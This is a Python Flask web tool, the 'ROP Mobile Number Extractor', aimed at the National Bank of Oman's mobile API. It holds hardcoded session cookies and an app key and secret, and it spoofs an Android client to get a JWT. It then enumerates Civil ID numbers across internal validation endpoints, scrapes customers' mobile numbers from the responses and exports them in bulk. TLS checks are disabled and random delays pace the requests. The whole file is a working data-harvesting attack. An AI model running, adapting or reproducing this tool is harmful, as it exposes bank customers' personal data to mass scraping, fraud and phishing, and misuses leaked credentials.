#!/usr/bin/env python3
"""
ROP Mobile Number Extractor - Web UI
Runs on port 8081
"""

import re, sys, os, time, random, json, csv, base64, threading, math
from datetime import datetime
from io import BytesIO
from urllib.parse import urlencode
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

from flask import Flask, render_template_string, request, jsonify, send_file, session
import requests

app = Flask(__name__)
app.secret_key = os.urandom(32).hex()

# ── Configuration ──
BASE_URL = "https://m.natbankoman.com"
MAINT_ENDP = "/nbombv9services/NBOService41/getMaintenanceStatus"
DEFAULT_COOKIE = (
    "BIGipServerNBOMBV9=1426592940.32291.0000; "
    "TS01282c7b=016e2a9d6c8d0392578496dd1033835d71ec7d7a1d71337810e305e5c08cee580f465f7bd2f46137fe9e60908d3bffdc1bbee0308ede8827551da3e8ec115f2398105516254385e93648ef393a9ee006f310b65235; "
    "f5avraaaaaaaaaaaaaaaa_session_=ELGEGAJHJAEHCIGFKNMCAAODCAKFEPGKGCCKFOKKJKEPOLCLFCGJBIOHBBOCKLNIMBKDFMMOANIFOEJFEELAJCMLPJDAAODNNGJDEDNNNBMMMOOCJHFLAECBFBEAMBNK"
)

ENDPOINTS = [
    "/nbombv9services/ESignatureServices/validateRopMobileNumberFromMala",
    "/nbombv9services/ESignatureServices/validateMobileNumberFromMala",
    "/nbombv9services/NBOService41/getCustomerDetailsByCivilId",
    "/nbombv9services/ESignatureServices/validateCivilIdAndMobileNumber",
    "/nbombv9services/rop/validateMobileNumberFromCivilId"
]

# ── Search Tracking ──
SEARCHES_FILE = "searches.txt"
SEARCH_COUNT_FILE = "search_count.txt"

def load_search_count():
    """Load the persistent search count from file."""
    try:
        if os.path.exists(SEARCH_COUNT_FILE):
            with open(SEARCH_COUNT_FILE, "r") as f:
                return int(f.read().strip())
    except (ValueError, IOError):
        pass
    return 0

def save_search_count(count):
    """Save the persistent search count to file."""
    try:
        with open(SEARCH_COUNT_FILE, "w") as f:
            f.write(str(count))
    except IOError:
        pass

def log_search(civil_id, endpoint, mobiles, status_code):
    """Append a search record to searches.txt."""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    mobiles_str = ", ".join(mobiles) if mobiles else "NONE"
    line = f"[{timestamp}] CID:{civil_id} | EP:{endpoint.split('/')[-1][:35]:<35} | Status:{status_code} | Mobiles: {mobiles_str}\n"
    try:
        with open(SEARCHES_FILE, "a") as f:
            f.write(line)
    except IOError:
        pass

def update_global_search_count():
    """Increment and save the global search counter. Returns the new count."""
    count = load_search_count() + 1
    save_search_count(count)
    return count

# ── Global state ──
extractor_state = {
    "auth_token": "",
    "secure_token": "",
    "cookies": {},
    "nbo_session": "InfinixInfinix X66349abe74daa0",
    "device_id": "InfinixInfinix X66349abe74daa0",
    "running": False,
    "results": [],
    "progress": "Idle",
    "search_count": load_search_count()
}

# ── Token Fetcher ──
class TokenFetcher:
    LOGIN_URL = "https://m.natbankoman.com/nbombv9authService/100000002/login"
    HEADERS_TEMPLATE = {
        "Cache-Control": "no-cache", "Connection": "keep-alive",
        "User-Agent": "URLConnection/android/2203121C", "Expect": "100-continue",
        "Accept-Encoding": "gzip, deflate, br",
        "X-Kony-SDK-Version": "9.7.52",
        "X-Kony-App-Key": "cca34dc0026bb9678c00fffea9c47f21",
        "Accept": "application/json",
        "X-Kony-App-Secret": "d171117d8e4d953977112b1678dd6615",
        "Content-Type": "application/x-www-form-urlencoded",
        "X-Kony-Platform-Type": "android", "X-Kony-SDK-Type": "js",
        "X-Kony-ReportingParams": '{"os":"9","dm":"2203121C","did":"1fbdf6be1aae335a","ua":"2203121C","aid":"NBOMB","aname":"NBOApp","chnl":"mobile","plat":"android","aver":"8.5.2","atype":"native","stype":"b2c","kuid":"","mfaid":"7f60bb17-9a22-4071-aa37-73e303e31d67","mfbaseid":"e8ea2e17-b5e4-4ec1-b690-29e631bcb060","mfaname":"NBO","sdkversion":"9.7.52","sdktype":"js","fid":"frmSplashScreen","sessiontype":"I","clientUUID":"1779032091723-f473-d2fd-5d64","rsid":"1781360478759-a32c-e5df-9f93","svcid":"login_$anonymousProvider"}'
    }

    @staticmethod
    def gen_rid():
        ts = str(int(time.time() * 1000))
        return f"{ts}-{format(random.randint(10000,99999),'05x')}-{format(random.randint(1000,9999),'04x')}-{format(random.randint(1000,9999),'04x')}"

    @classmethod
    def fetch(cls):
        headers = dict(cls.HEADERS_TEMPLATE)
        headers["X-Kony-RequestId"] = cls.gen_rid()
        headers["Cookie"] = DEFAULT_COOKIE
        try:
            resp = requests.post(cls.LOGIN_URL, headers=headers, timeout=30, verify=False)
            if resp.status_code not in (200, 201):
                return {"success": False, "error": f"HTTP {resp.status_code}"}
            data = resp.json()
            claims = data.get("claims_token", {})
            jwt = claims.get("value", "") if isinstance(claims, dict) else (claims if isinstance(claims, str) else "")
            sid = claims.get("session_id", "") if isinstance(claims, dict) else data.get("session_id", "")
            if not jwt:
                return {"success": False, "error": "No JWT in response"}
            return {"success": True, "jwt": jwt, "session_id": sid, "refresh_token": data.get("refresh_token","")}
        except Exception as e:
            return {"success": False, "error": str(e)}

# ── Core extraction logic ──
def fetch_secure_token(state):
    rid = f"{int(time.time()*1000)}-{format(random.randint(1000,9999),'04x')}-{format(random.randint(1000,9999),'04x')}-{format(random.randint(1000,9999),'04x')}"
    headers = {
        "User-Agent": "URLConnection/android/Infinix X663",
        "X-Kony-Authorization": state["auth_token"],
        "X-Kony-API-Version": "1.0", "X-Kony-RequestId": rid,
        "Content-Type": "application/x-www-form-urlencoded",
        "nboSessionID": state["nbo_session"],
    }
    if state["cookies"]:
        headers["Cookie"] = "; ".join(f"{k}={v}" for k,v in state["cookies"].items())
    data = {
        "deviceId": state["device_id"], "serviceID": "getMaintenanceStatus",
        "httpconfig": '{"timeout":120}', "SecureToken": "",
        "appID": "NBOMB", "channel": "rc", "appver": "8.4.1", "platform": "android", "cacheid": "",
        "konyreportingparams": '{"os":"12","dm":"Infinix X663","did":"49abe74daa0db05a","aid":"NBOMB","aname":"NBO","chnl":"mobile","plat":"android","aver":"8.4.1","atype":"native","stype":"b2c","kuid":"","mfaid":"7f60bb17-9a22-4071-aa37-73e303e31d67","mfbaseid":"e8ea2e17-b5e4-4ec1-b690-29e631bcb060","mfaname":"NBO","sdkversion":"9.7.52","sdktype":"js","fid":"frmSplashScreen","sessiontype":"I","clientUUID":"1775751017966-a95f-c704-0dd4","rsid":"1777237748842-3e42-6b4b-5793","svcid":"getMaintenanceStatus"}'
    }
    try:
        resp = requests.post(BASE_URL + MAINT_ENDP, data=urlencode(data), headers=headers, timeout=15, verify=False)
        j = resp.json()
        token = j.get("SecureToken","")
        if token:
            state["cookies"].update(resp.cookies.get_dict())
            return token
    except:
        pass
    return ""

def parse_mobiles(text):
    found = set()
    patterns = [
        r'"mobileNumber_M["\s]*:\s*["\s]*([^"]*)"',
        r'"ropMaskedMobileNumber["\s]*:\s*["\s]*([^"]*)"',
        r'"mobileNumber_M_List["\s]*:\s*["\s]*([^"]*)"',
        r'"mobile["\s]*:\s*["\s]*([^"]*)"',
        r'"phone["\s]*:\s*["\s]*([^"]*)"',
        r'"phoneNumber["\s]*:\s*["\s]*([^"]*)"',
        r'"contactNumber["\s]*:\s*["\s]*([^"]*)"',
        r'968\d{7}', r'\+?968\d{7}', r'\b\d{4}\*{3,4}\b',
    ]
    for pat in patterns:
        for m in re.finditer(pat, text, re.I | re.DOTALL):
            val = m.group(1) if m.lastindex else m.group(0)
            val = re.sub(r'["\s]','',val.strip())
            if val and len(val) >= 4:
                found.add(val)
    return sorted(found)[:5]

def hit_endpoint(state, endpoint, civil_id):
    ts = str(int(time.time() * 1000))
    rid = f"{ts}-{format(random.randint(1000,9999),'04x')}-{format(random.randint(1000,9999),'04x')}-{format(random.randint(1000,9999),'04x')}"
    headers = {
        "User-Agent": "URLConnection/android/Infinix X663",
        "X-Kony-Authorization": state["auth_token"],
        "X-Kony-API-Version": "1.0", "X-Kony-RequestId": rid,
        "Content-Type": "application/x-www-form-urlencoded",
        "nboSessionID": state["nbo_session"],
    }
    if state["cookies"]:
        headers["Cookie"] = "; ".join(f"{k}={v}" for k,v in state["cookies"].items())
    svc = endpoint.split("/")[-1]
    payload = {
        "serviceID": svc, "serviceName": svc, "custId": "******",
        "idNum": civil_id, "civilId": civil_id, "lang": "en",
        "SecureToken": state["secure_token"], "deviceId": state["device_id"],
        "sessionId": state["device_id"], "statusCode": "N", "action": "validate",
    }
    try:
        resp = requests.post(BASE_URL + endpoint, data=urlencode(payload), headers=headers, timeout=12, verify=False)
        mobiles = parse_mobiles(resp.text)
        return mobiles, resp.status_code
    except Exception as e:
        return [], 0

def run_extraction(state, ids_list, selected_endpoints):
    state["running"] = True
    state["results"] = []
    state["progress"] = "Fetching SecureToken..."
    token = fetch_secure_token(state)
    if not token:
        state["progress"] = "Failed to get SecureToken"
        state["running"] = False
        return
    state["secure_token"] = token

    total = len(ids_list) * len(selected_endpoints)
    completed = 0
    local_search_count = load_search_count()

    for i, cid in enumerate(ids_list, 1):
        if not state["running"]:
            break
        state["progress"] = f"[{i}/{len(ids_list)}] Processing CID {cid}..."
        for ep in selected_endpoints:
            if not state["running"]:
                break
            mobiles, sc = hit_endpoint(state, ep, cid)
            ep_short = ep.split("/")[-1][:35]
            completed += 1
            
            # Log this search to searches.txt
            log_search(cid, ep, mobiles, sc)
            
            # Increment the persistent search count
            local_search_count += 1
            save_search_count(local_search_count)
            state["search_count"] = local_search_count
            
            rec = {
                "civil_id": cid, "endpoint": ep_short,
                "mobiles": ", ".join(mobiles) if mobiles else "",
                "status_code": sc,
                "timestamp": datetime.now().strftime("%H:%M:%S"),
                "hit": bool(mobiles)
            }
            state["results"].append(rec)
            time.sleep(random.uniform(0.6, 1.3))

    hits = sum(1 for r in state["results"] if r["hit"])
    state["progress"] = f"Complete: {len(state['results'])} requests, {hits} hits"
    state["running"] = False

# ── Web Routes ──
HTML = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>ROP Mobile Number Extractor</title>
<style>
* { margin: 0; padding: 0; box-sizing: border-box; }
body { font-family: 'Segoe UI', Arial, sans-serif; background: #0d1b2a; color: #c9d1d9; min-height: 100vh; }
.container { max-width: 1400px; margin: 0 auto; padding: 20px; }
.header { display: flex; align-items: center; justify-content: space-between; padding: 15px 0; border-bottom: 2px solid #d4a843; margin-bottom: 20px; }
.header h1 { color: #d4a843; font-size: 24px; }
.header span { color: #4a5a6a; font-size: 12px; }
.status { display: flex; align-items: center; gap: 12px; }
.dot { width: 14px; height: 14px; border-radius: 50%; display: inline-block; }
.dot.online { background: #4ec64e; }
.dot.offline { background: #ff4444; }
.search-counter { background: #1b2838; border: 1px solid #d4a843; border-radius: 4px; padding: 4px 12px; font-size: 13px; color: #d4a843; font-weight: bold; }
.grid { display: grid; grid-template-columns: 380px 1fr; gap: 20px; }
.card { background: #1b2838; border-radius: 8px; padding: 15px; border: 1px solid #2a3a4a; margin-bottom: 15px; }
.card h3 { color: #d4a843; font-size: 14px; margin-bottom: 10px; border-bottom: 1px solid #2a3a4a; padding-bottom: 8px; }
label { display: block; font-size: 12px; color: #7a8a9a; margin-bottom: 4px; }
textarea, input, select { width: 100%; background: #0d1117; color: #c9d1d9; border: 1px solid #2a3a4a; border-radius: 4px; padding: 8px; font-family: 'Consolas', monospace; font-size: 13px; margin-bottom: 10px; }
textarea:focus, input:focus { outline: none; border-color: #d4a843; }
.btn { padding: 10px 20px; border: none; border-radius: 4px; cursor: pointer; font-weight: bold; font-size: 13px; transition: 0.2s; }
.btn-primary { background: #d4a843; color: #0d1b2a; }
.btn-primary:hover { background: #e4b853; }
.btn-danger { background: #6b1a1a; color: white; }
.btn-danger:hover { background: #8b2a2a; }
.btn-success { background: #1a6b3a; color: white; }
.btn-success:hover { background: #2a8b4a; }
.btn-sm { padding: 5px 12px; font-size: 12px; }
.btn:disabled { opacity: 0.5; cursor: not-allowed; }
.ep-list { display: grid; grid-template-columns: 1fr 1fr; gap: 4px; margin-bottom: 10px; }
.ep-item { display: flex; align-items: center; gap: 6px; font-size: 11px; color: #7a8a9a; }
.ep-item input { width: auto; margin: 0; }
table { width: 100%; border-collapse: collapse; font-size: 12px; }
th { background: #0d1117; color: #d4a843; padding: 8px 6px; text-align: left; border-bottom: 2px solid #d4a843; }
td { padding: 6px; border-bottom: 1px solid #1a2a3a; }
tr:hover { background: #1a2a3a; }
.hit { color: #4ec64e; font-weight: bold; }
.miss { color: #ff4444; }
.progress-bar { height: 4px; background: #0d1117; border-radius: 2px; margin: 10px 0; overflow: hidden; }
.progress-fill { height: 100%; background: #d4a843; border-radius: 2px; transition: width 0.3s; }
#progress_text { font-size: 12px; color: #7a8a9a; margin-bottom: 10px; }
.btn-row { display: flex; gap: 8px; margin-top: 10px; }
#results_count { font-size: 13px; color: #4ec64e; margin-bottom: 10px; }
</style>
</head>
<body>
<div class="container">
<div class="header">
<div>
<h1>ROP Mobile Number Extractor</h1>
<span>NBO Banking ROP Integration &bull; Web Interface</span>
</div>
<div class="status">
<span class="search-counter" id="searchCounter">🔍 {{ search_count }}</span>
<span class="dot online" id="statusDot"></span>
<span id="statusText">Ready</span>
</div>
</div>

<div class="grid">
<div>
<div class="card">
<h3>🔑 Token Management</h3>
<button class="btn btn-primary" onclick="fetchToken()" id="tokenBtn">🔄 GET FRESH JWT TOKEN</button>
<div id="tokenInfo" style="font-size:11px;color:#ff8844;margin-top:8px;">No active token</div>
</div>

<div class="card">
<h3>🎯 Endpoints</h3>
<div class="ep-list">
{% for i, ep in enumerate(endpoints) %}
<div class="ep-item">
<input type="checkbox" id="ep{{i}}" checked>
<label for="ep{{i}}" style="margin:0;display:inline">{{ ep.split('/')[-1][:28] }}</label>
</div>
{% endfor %}
</div>
</div>

<div class="card">
<h3>📋 Civil IDs</h3>
<textarea id="idsInput" rows="8" placeholder="One Civil ID per line...">137470471
137470472
137470473</textarea>
</div>

<div class="btn-row">
<button class="btn btn-success" onclick="startExtract()" id="startBtn" style="flex:1">▶ START EXTRACTION</button>
<button class="btn btn-danger" onclick="stopExtract()" id="stopBtn" style="flex:1" disabled>■ STOP</button>
</div>

<div class="progress-bar"><div class="progress-fill" id="progressFill" style="width:0%"></div></div>
<div id="progress_text">Idle</div>
</div>

<div>
<div class="card">
<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px;">
<h3 style="border:none;padding:0;margin:0;">📊 Results</h3>
<div>
<button class="btn btn-primary btn-sm" onclick="exportCSV()">EXPORT CSV</button>
<button class="btn btn-primary btn-sm" onclick="exportJSON()">EXPORT JSON</button>
<button class="btn btn-primary btn-sm" onclick="exportTXT()">EXPORT TXT</button>
<button class="btn btn-sm" onclick="clearResults()" style="background:#2a3a4a;color:white;">CLEAR</button>
</div>
</div>
<div id="results_count">No results yet</div>
<div style="max-height:600px;overflow-y:auto;">
<table>
<thead><tr><th>#</th><th>Civil ID</th><th>Endpoint</th><th>Mobile(s)</th><th>Status</th><th>Time</th></tr></thead>
<tbody id="resultsBody"></tbody>
</table>
</div>
</div>
</div>
</div>
</div>

<script>
const endpoints = {{ endpoints | tojson }};
let pollInterval = null;

async function fetchToken() {
    const btn = document.getElementById('tokenBtn');
    btn.disabled = true; btn.textContent = '⏳ FETCHING...';
    try {
        const r = await fetch('/api/fetch-token');
        const d = await r.json();
        if (d.success) {
            document.getElementById('tokenInfo').innerHTML = '✅ JWT: ' + d.jwt.slice(0,40) + '... (' + d.jwt.length + ' chars)';
            document.getElementById('tokenInfo').style.color = '#4ec64e';
            document.getElementById('statusDot').className = 'dot online';
            document.getElementById('statusText').textContent = 'Token: ' + d.jwt.slice(0,20) + '...';
        } else {
            document.getElementById('tokenInfo').innerHTML = '❌ ' + d.error;
            document.getElementById('tokenInfo').style.color = '#ff4444';
        }
    } catch(e) {
        document.getElementById('tokenInfo').innerHTML = '❌ Connection error';
    }
    btn.disabled = false; btn.textContent = '🔄 GET FRESH JWT TOKEN';
}

async function startExtract() {
    const ids = document.getElementById('idsInput').value.trim().split('\\n').filter(l => l.trim() && !l.trim().startsWith('#'));
    if (!ids.length) { alert('Enter at least one Civil ID!'); return; }
    const eps = [];
    {% for i in range(endpoints|length) %}
    if (document.getElementById('ep{{i}}').checked) eps.push({{i}});
    {% endfor %}
    if (!eps.length) { alert('Select at least one endpoint!'); return; }

    document.getElementById('startBtn').disabled = true;
    document.getElementById('stopBtn').disabled = false;

    const r = await fetch('/api/start', {
        method: 'POST',
        headers: {'Content-Type':'application/json'},
        body: JSON.stringify({ids, endpoints: eps})
    });
    const d = await r.json();
    if (d.error) { alert(d.error); return; }

    document.getElementById('progress_text').textContent = 'Starting...';
    if (pollInterval) clearInterval(pollInterval);
    pollInterval = setInterval(pollStatus, 1000);
}

async function stopExtract() {
    await fetch('/api/stop');
    document.getElementById('startBtn').disabled = false;
    document.getElementById('stopBtn').disabled = true;
    if (pollInterval) { clearInterval(pollInterval); pollInterval = null; }
    document.getElementById('progress_text').textContent = 'Stopped by user';
}

async function pollStatus() {
    try {
        const r = await fetch('/api/status');
        const d = await r.json();
        document.getElementById('progress_text').textContent = d.progress;
        document.getElementById('progressFill').style.width = d.progress_pct + '%';
        document.getElementById('results_count').textContent = d.total + ' requests, ' + d.hits + ' hits';

        // Update the search counter in the header
        if (d.search_count !== undefined) {
            document.getElementById('searchCounter').textContent = '🔍 ' + d.search_count;
        }

        if (d.results_html) {
            document.getElementById('resultsBody').innerHTML = d.results_html;
        }

        if (!d.running) {
            document.getElementById('startBtn').disabled = false;
            document.getElementById('stopBtn').disabled = true;
            if (pollInterval) { clearInterval(pollInterval); pollInterval = null; }
        }
    } catch(e) {}
}

async function exportCSV() { window.location.href = '/api/export/csv'; }
async function exportJSON() { window.location.href = '/api/export/json'; }
async function exportTXT() { window.location.href = '/api/export/txt'; }
async function clearResults() {
    await fetch('/api/clear');
    document.getElementById('resultsBody').innerHTML = '';
    document.getElementById('results_count').textContent = 'No results yet';
}
</script>
</body>
</html>"""

@app.route('/')
def index():
    return render_template_string(HTML, endpoints=ENDPOINTS, enumerate=enumerate, search_count=load_search_count())

@app.route('/api/fetch-token')
def api_fetch_token():
    result = TokenFetcher.fetch()
    if result["success"]:
        extractor_state["auth_token"] = result["jwt"]
        extractor_state["nbo_session"] = result.get("session_id", extractor_state["nbo_session"])
        return jsonify({"success": True, "jwt": result["jwt"], "session": result.get("session_id","")})
    return jsonify({"success": False, "error": result.get("error","Unknown")})

@app.route('/api/start', methods=['POST'])
def api_start():
    if extractor_state["running"]:
        return jsonify({"error": "Already running"})
    data = request.json
    ids_raw = data.get("ids", [])
    eps_indices = data.get("endpoints", [])

    ids_list = []
    for line in ids_raw:
        digits = re.sub(r'[^\d]', '', line.strip())
        if len(digits) >= 6:
            ids_list.append(digits)
    ids_list = list(dict.fromkeys(ids_list))

    if not ids_list:
        return jsonify({"error": "No valid Civil IDs"})

    selected = [ENDPOINTS[i] for i in eps_indices if 0 <= i < len(ENDPOINTS)]
    if not selected:
        selected = list(ENDPOINTS)

    if not extractor_state["auth_token"]:
        return jsonify({"error": "No auth token. Click GET FRESH JWT TOKEN first."})

    thread = threading.Thread(target=run_extraction, args=(extractor_state, ids_list, selected), daemon=True)
    thread.start()
    return jsonify({"ok": True})

@app.route('/api/stop')
def api_stop():
    extractor_state["running"] = False
    return jsonify({"ok": True})

@app.route('/api/status')
def api_status():
    state = extractor_state
    n = len(state["results"])
    hits = sum(1 for r in state["results"] if r["hit"])
    total = n

    rows_html = ""
    for i, r in enumerate(state["results"], 1):
        cls = "hit" if r["hit"] else "miss"
        status_txt = f"✅ {len(r['mobiles'].split(',')) if r['mobiles'] else 0}" if r["hit"] else f"❌ {r['status_code']}"
        mobiles = r["mobiles"] if r["mobiles"] else "—"
        rows_html += f"<tr><td>{i}</td><td>{r['civil_id']}</td><td>{r['endpoint']}</td><td class='{cls}'>{mobiles}</td><td>{status_txt}</td><td>{r['timestamp']}</td></tr>"

    pct = 0
    if state["running"]:
        pct = 50
    elif state["progress"].startswith("Complete"):
        pct = 100

    return jsonify({
        "running": state["running"],
        "progress": state["progress"],
        "progress_pct": pct,
        "total": total,
        "hits": hits,
        "search_count": state["search_count"],
        "results_html": rows_html
    })

@app.route('/api/export/csv')
def api_export_csv():
    import csv, io
    si = io.StringIO()
    w = csv.writer(si)
    w.writerow(["#", "Civil ID", "Endpoint", "Mobile(s)", "Status Code", "Timestamp", "Hit"])
    for i, r in enumerate(extractor_state["results"], 1):
        w.writerow([i, r["civil_id"], r["endpoint"], r["mobiles"], r["status_code"], r["timestamp"], r["hit"]])
    output = si.getvalue()
    from flask import Response
    return Response(output, mimetype='text/csv', headers={"Content-Disposition": f"attachment;filename=rop_results_{datetime.now().strftime('%Y%m%d_%H%M')}.csv"})

@app.route('/api/export/json')
def api_export_json():
    from flask import Response
    return Response(json.dumps(extractor_state["results"], indent=2), mimetype='application/json',
                    headers={"Content-Disposition": f"attachment;filename=rop_results_{datetime.now().strftime('%Y%m%d_%H%M')}.json"})

@app.route('/api/export/txt')
def api_export_txt():
    lines = []
    lines.append("ROP Mobile Number Extractor - Results")
    lines.append("=" * 40)
    lines.append(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    lines.append("")
    lines.append("Civil ID      | Mobile Number")
    lines.append("-" * 30)

    seen = set()
    for r in extractor_state['results']:
        if r['mobiles']:
            for m in r['mobiles'].split(', '):
                m = m.strip()
                if m and m not in seen:
                    seen.add(m)
                    lines.append(f"{r['civil_id']:<13} | {m}")

    if not seen:
        lines.append("(No mobile numbers found)")

    lines.append("")
    lines.append(f"Total unique mobiles: {len(seen)}")
    lines.append("=" * 40)

    output = "\n".join(lines)
    from flask import Response
    return Response(output, mimetype='text/plain',
                    headers={"Content-Disposition": f"attachment;filename=rop_mobiles_{datetime.now().strftime('%Y%m%d_%H%M')}.txt"})

@app.route('/api/clear')
def api_clear():
    extractor_state["results"] = []
    extractor_state["progress"] = "Cleared"
    return jsonify({"ok": True})

@app.route('/api/searches-file')
def api_view_searches_file():
    """View the searches.txt file content."""
    try:
        if os.path.exists(SEARCHES_FILE):
            with open(SEARCHES_FILE, "r") as f:
                content = f.read()
            return Response(content, mimetype='text/plain')
        return Response("(No searches recorded yet)", mimetype='text/plain')
    except Exception as e:
        return Response(f"Error: {str(e)}", mimetype='text/plain')

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 8081))
    host = os.environ.get("HOST", "0.0.0.0")
    
    # Initialize search count file if it doesn't exist
    if not os.path.exists(SEARCH_COUNT_FILE):
        save_search_count(0)
    
    # Initialize searches file with a header if it doesn't exist
    if not os.path.exists(SEARCHES_FILE):
        try:
            with open(SEARCHES_FILE, "w") as f:
                f.write(f"ROP Mobile Number Extractor - Search History\n")
                f.write(f"Initialized: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write("=" * 80 + "\n")
        except IOError:
            pass
    
    print(f"ROP Extractor Web UI starting on http://{host}:{port}")
    print(f"Searches logged to: {SEARCHES_FILE}")
    print(f"Search count: {load_search_count()}")
    app.run(host=host, port=port, debug=False, threaded=True)